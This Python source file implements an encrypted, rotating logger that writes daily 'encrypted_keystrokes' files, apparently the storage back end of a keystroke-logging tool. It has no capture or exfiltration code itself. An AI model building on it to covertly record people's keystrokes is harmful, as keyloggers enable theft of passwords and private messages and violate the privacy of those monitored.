import subprocess
import time
from datetime import datetime
from cryptography.fernet import Fernet
from pathlib import Path
from queue import Queue, Empty
from threading import Thread, Event

class SecureLogger:
    def __init__(self, data_dir: Path = Path(__file__).parent.parent / "data"):
        self.data_dir = data_dir
        self.key_path = self.data_dir / "aes_key.key"
        self.log_path = self.data_dir / self._log_filename()
        self.rust_logger_path = Path(__file__).parent.parent / "RustLogger" / "target" / "release" / "rust_logger.exe"
        self.max_log_size = 5 * 1024 * 1024  # 5 MB
        self.fernet = Fernet(self._get_or_create_key())

        self._ensure_data_dir()
        self.queue = Queue()
        self.stop_event = Event()
        self.worker = Thread(target=self._writer_loop, daemon=True)
        self.worker.start()

    def _ensure_data_dir(self):
        self.data_dir.mkdir(parents=True, exist_ok=True)

    def _get_or_create_key(self) -> bytes:
        if self.key_path.exists():
            return self.key_path.read_bytes()
        key = Fernet.generate_key()
        self.key_path.write_bytes(key)
        return key

    def _log_filename(self) -> str:
        today = datetime.now().strftime("%Y-%m-%d")
        return f"encrypted_keystrokes_{today}.log"

    def _writer_loop(self):
        while not self.stop_event.is_set() or not self.queue.empty():
            try:
                message = self.queue.get(timeout=0.5)
                self._rotate_log_file()
                timestamp = datetime.now().isoformat()
                encrypted = self.fernet.encrypt(f"[{timestamp}] {message}".encode())
                with self.log_path.open("ab") as f:
                    f.write(encrypted + b"\n")
            except Empty:
                continue
            except Exception as e:
                print(f"[!] Logging error: {e}")

    def _rotate_log_file(self):
        if self.log_path.exists() and self.log_path.stat().st_size > self.max_log_size:
            timestamp = int(time.time())
            rotated = self.log_path.with_name(f"{self.log_path.stem}_{timestamp}.log")
            self.log_path.rename(rotated)
            print(f"[i] Rotated log to: {rotated.name}")

    def log(self, message: str):
        self.queue.put(message)

    def log_with_rust(self, message: str):
        try:
            subprocess.run([str(self.rust_logger_path), message], check=True)
            print("[+] Logged (Rust, encrypted)")
        except FileNotFoundError:
            print(f"❌ Rust logger not found at: {self.rust_logger_path}")
        except subprocess.CalledProcessError as e:
            print("❌ Rust logger failed:", e)

    def shutdown(self):
        self.stop_event.set()
        self.worker.join()
        print("[✓] Logger shut down cleanly.")
